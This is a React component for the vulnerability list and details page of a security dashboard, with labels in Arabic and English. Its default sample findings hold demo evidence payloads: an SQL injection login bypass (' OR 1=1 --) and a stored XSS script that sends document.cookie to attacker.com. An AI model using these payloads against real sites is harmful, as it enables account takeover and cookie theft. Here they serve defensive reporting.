import React, { useState } from 'react';
import { 
  ShieldAlert, Search, RefreshCw, AlertTriangle, Check, Eye, 
  X, Terminal, Cpu, Code, Sliders, ExternalLink, FileText 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { Card } from '../../shared/components/Card';
import { Button } from '../../shared/components/Button';
import { SeverityBadge, Badge } from '../../shared/components/Badge';

export interface VulnerabilitiesPageProps {
  vulnerabilities: any[];
  userProfile: any;
  actionLoading: string | null;
  onOpenSelfHealing: (findingId: string) => void;
}

export const VulnerabilitiesPage: React.FC<VulnerabilitiesPageProps> = ({
  vulnerabilities = [],
  userProfile,
  actionLoading,
  onOpenSelfHealing
}) => {
  const [searchQuery, setSearchQuery] = useState('');
  const [severityFilter, setSeverityFilter] = useState('All');
  const [selectedVulnForDetails, setSelectedVulnForDetails] = useState<any | null>(null);

  const defaultVulnsList = [
    {
      id: 'v-sql-1',
      title: 'SQL Injection Vulnerability',
      type: 'SQL Injection',
      severity: 'Critical',
      asset: 'api.banking-system.com',
      targetName: 'API Banking Portal',
      status: 'Open',
      cvssScore: 9.8,
      location: 'POST /login [username parameter]',
      description: 'The application allows untrusted user input to reach database queries without prior sanitization or parameterized execution.',
      evidenceRequest: `POST /login HTTP/1.1\nHost: api.banking-system.com\nContent-Type: application/json\n\n{\n  "username": "' OR 1=1 --",\n  "password": "password123"\n}`,
      aiCause: 'عدم استخدام Parameterized Queries وتضمين المدخلات مباشرة في الاستعلام.',
      aiFix: 'استخدام Prepared Statements واستعلامات الإسناد المباشر عبر ORM أو كائنات الفلترة.',
      complianceMapping: { owasp: 'A03:2021-Injection', iso27001: 'A.14.2.1', pciDss: '6.5.1' }
    },
    {
      id: 'v-xss-2',
      title: 'Stored Cross-Site Scripting (XSS)',
      type: 'Stored XSS',
      severity: 'High',
      asset: 'web.company.com',
      targetName: 'Main Web Portal',
      status: 'Fixing',
      cvssScore: 8.2,
      location: 'POST /api/comments [body text]',
      description: 'Attacker payload gets stored in the database and executed inside the browser context of other visiting administrators.',
      evidenceRequest: `POST /api/comments HTTP/1.1\nHost: web.company.com\n\n{\n  "comment": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"\n}`,
      aiCause: 'تخزين كود HTML غير المفلتر وعرضه بدون HTML Entity Encoding.',
      aiFix: 'ترميز البيانات عند المخرجات باستعمال DOMPurify وإضافة العناوين Content-Security-Policy.',
      complianceMapping: { owasp: 'A03:2021-Injection', iso27001: 'A.14.2.5', pciDss: '6.5.7' }
    },
    {
      id: 'v-tls-3',
      title: 'Weak TLS Configuration',
      type: 'Weak Cryptography',
      severity: 'Medium',
      asset: 'server-prod-01',
      targetName: 'Production Server',
      status: 'Closed',
      cvssScore: 5.4,
      location: 'Port 443 TLS 1.0 & 1.1 Enabled',
      description: 'The web server supports obsolete SSL/TLS ciphers vulnerable to POODLE and BEAST attacks.',
      evidenceRequest: `CONNECT server-prod-01:443 HTTP/1.1\nHandshake: TLSv1.0 Cipher: ECDHE-RSA-DES-CBC3-SHA`,
      aiCause: 'تمكين البروتوكولات القديمة في تكوين Nginx / Apache.',
      aiFix: 'تعطيل TLS 1.0 و 1.1 واشتراط TLS 1.2 و TLS 1.3 مع تشفير العنونة التفاعلي.',
      complianceMapping: { owasp: 'A02:2021-Cryptographic Failures', iso27001: 'A.10.1.1', pciDss: '4.1' }
    }
  ];

  const rawVulns = Array.isArray(vulnerabilities) && vulnerabilities.length > 0 ? vulnerabilities : defaultVulnsList;

  const filteredVulns = rawVulns.filter(vuln => {
    const matchesSearch = (vuln?.title || '').toLowerCase().includes(searchQuery.toLowerCase()) || 
                          (vuln?.type || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
                          (vuln?.asset || vuln?.targetName || '').toLowerCase().includes(searchQuery.toLowerCase());
    const matchesSeverity = severityFilter === 'All' || vuln?.severity === severityFilter;
    return matchesSearch && matchesSeverity;
  });

  return (
    <div className="space-y-6 text-right" dir="rtl">
      
      {/* HEADER & FILTERS */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <div>
          <h2 className="text-xl font-black text-white flex items-center gap-2">
            <ShieldAlert className="w-6 h-6 text-red-400" />
            Vulnerabilities Management (إدارة ومعالجة الثغرات)
          </h2>
          <p className="text-xs text-slate-400 mt-1">جدول التدقيق الفني للثغرات المكتشفة مع عرض الدلائل وتقارير الترميم بالذكاء الاصطناعي</p>
        </div>
        
        {/* FILTERS PANEL */}
        <div className="flex flex-wrap items-center gap-2.5 w-full sm:w-auto">
          <div className="relative flex-1 sm:flex-initial">
            <Search className="w-3.5 h-3.5 text-slate-500 absolute right-3 top-2.5" />
            <input 
              type="text" 
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              placeholder="ابحث بالعنوان، الأصول، أو نوع الثغرة..."
              className="bg-slate-900 border border-slate-800 rounded-xl pr-9 pl-3 py-2 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500 w-full sm:w-64"
            />
          </div>
          <select 
            value={severityFilter}
            onChange={e => setSeverityFilter(e.target.value)}
            className="bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none"
          >
            <option value="All">All Severities (جميع المستويات)</option>
            <option value="Critical">Critical (حرج)</option>
            <option value="High">High (عالٍ)</option>
            <option value="Medium">Medium (متوسط)</option>
            <option value="Low">Low (منخفض)</option>
          </select>
        </div>
      </div>

      {/* VULNERABILITIES DATA TABLE */}
      <Card variant="cyber" className="overflow-hidden p-0">
        <div className="overflow-x-auto">
          <table className="w-full text-right text-xs">
            <thead className="bg-[#070B14] border-b border-slate-800 text-slate-400 font-bold uppercase">
              <tr>
                <th className="p-4">Severity (مستوى الخطورة)</th>
                <th className="p-4">Issue (الثغرة والمشكلة)</th>
                <th className="p-4">Asset (الأصل/المورد)</th>
                <th className="p-4">Status (الحالة)</th>
                <th className="p-4 text-center">Actions (الإجراءات)</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 bg-[#0D111C]">
              {filteredVulns.map((v) => (
                <tr key={v.id} className="hover:bg-slate-900/60 transition-colors">
                  <td className="p-4">
                    <SeverityBadge severity={v.severity} />
                  </td>
                  <td className="p-4">
                    <div className="font-bold text-white text-xs">{v.title}</div>
                    <div className="text-[10px] text-slate-400 font-mono mt-0.5">{v.location || v.type}</div>
                  </td>
                  <td className="p-4">
                    <span className="font-mono text-cyan-400 text-xs">{v.asset || v.targetName || 'N/A'}</span>
                  </td>
                  <td className="p-4">
                    <Badge variant={v.status === 'Open' ? 'danger' : v.status === 'Fixing' ? 'warning' : 'success'}>
                      {v.status || 'Open'}
                    </Badge>
                  </td>
                  <td className="p-4 text-center space-x-2 space-x-reverse">
                    <button
                      onClick={() => setSelectedVulnForDetails(v)}
                      className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-semibold inline-flex items-center gap-1"
                    >
                      <Eye className="w-3.5 h-3.5 text-cyan-400" />
                      التفاصيل والدلائل
                    </button>
                    <button
                      onClick={() => onOpenSelfHealing(v.id)}
                      className="px-3 py-1.5 bg-cyan-950 border border-cyan-500/30 hover:bg-cyan-900 text-cyan-300 rounded-lg text-xs font-semibold inline-flex items-center gap-1"
                    >
                      <RefreshCw className="w-3.5 h-3.5" />
                      الترميم بالذكاء الاصطناعي
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>

      {/* VULNERABILITY DETAILS MODAL */}
      <AnimatePresence>
        {selectedVulnForDetails && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md" dir="rtl">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-2xl bg-[#0D111C] border border-slate-800 rounded-2xl overflow-hidden shadow-2xl space-y-4"
            >
              {/* Modal Header */}
              <div className="p-5 border-b border-slate-800 bg-[#070B14] flex justify-between items-center">
                <div className="flex items-center gap-3">
                  <SeverityBadge severity={selectedVulnForDetails.severity} />
                  <div>
                    <h3 className="text-sm font-bold text-white">{selectedVulnForDetails.title}</h3>
                    <p className="text-[10px] text-slate-400">{selectedVulnForDetails.asset || selectedVulnForDetails.targetName}</p>
                  </div>
                </div>
                <button 
                  onClick={() => setSelectedVulnForDetails(null)} 
                  className="text-slate-400 hover:text-white"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Modal Content */}
              <div className="p-6 space-y-4 text-xs overflow-y-auto max-h-[75vh]">
                
                {/* CVSS Risk Score Bar */}
                <div className="p-3 bg-[#070B14] border border-slate-800 rounded-xl flex items-center justify-between">
                  <div>
                    <span className="text-[10px] text-slate-400 block">Risk Score (درجة الخطر الفني):</span>
                    <span className="text-lg font-black text-red-400 font-mono">
                      {selectedVulnForDetails.cvssScore || '9.8'} / 10
                    </span>
                  </div>
                  <Badge variant="danger">CRITICAL VULNERABILITY</Badge>
                </div>

                {/* Description */}
                <div className="space-y-1">
                  <span className="font-bold text-slate-300 block">Description (الوصف):</span>
                  <p className="text-slate-300 bg-[#070B14] p-3 rounded-xl border border-slate-800 leading-relaxed">
                    {selectedVulnForDetails.description || 'The application allows untrusted input to reach database queries.'}
                  </p>
                </div>

                {/* Evidence Payload */}
                <div className="space-y-1">
                  <span className="font-bold text-slate-300 block">Evidence (الدلائل والحمولة البرمجية):</span>
                  <pre className="p-3 bg-black border border-slate-800 rounded-xl text-[10px] font-mono text-cyan-300 overflow-x-auto dir-ltr">
                    {selectedVulnForDetails.evidenceRequest || `POST /login\nusername=' OR 1=1 --`}
                  </pre>
                </div>

                {/* AI Explanation & Fix */}
                <div className="p-4 bg-purple-950/20 border border-purple-500/30 rounded-xl space-y-2">
                  <span className="font-bold text-purple-300 flex items-center gap-1">
                    <Cpu className="w-4 h-4 text-purple-400" />
                    🤖 Sniper AI Explanation & Recommended Action:
                  </span>
                  <p className="text-slate-300">
                    <strong className="text-white">سبب المشكلة: </strong>
                    {selectedVulnForDetails.aiCause || 'عدم استخدام Parameterized Queries.'}
                  </p>
                  <p className="text-emerald-400 font-mono">
                    <strong className="text-white">الحل البرمجي الموصى به: </strong>
                    {selectedVulnForDetails.aiFix || 'Use Prepared Statements / Parameterized Queries.'}
                  </p>
                </div>

                {/* Actions */}
                <div className="pt-3 border-t border-slate-800 flex justify-end gap-3">
                  <Button
                    onClick={() => setSelectedVulnForDetails(null)}
                    variant="ghost"
                    className="text-slate-400 hover:text-white text-xs"
                  >
                    إغلاق
                  </Button>
                  <Button
                    onClick={() => {
                      const id = selectedVulnForDetails.id;
                      setSelectedVulnForDetails(null);
                      onOpenSelfHealing(id);
                    }}
                    className="bg-gradient-to-r from-cyan-600 to-purple-600 text-white text-xs font-bold"
                  >
                    تشغيل الترميم والشفاء الذاتي
                  </Button>
                </div>

              </div>

            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
};
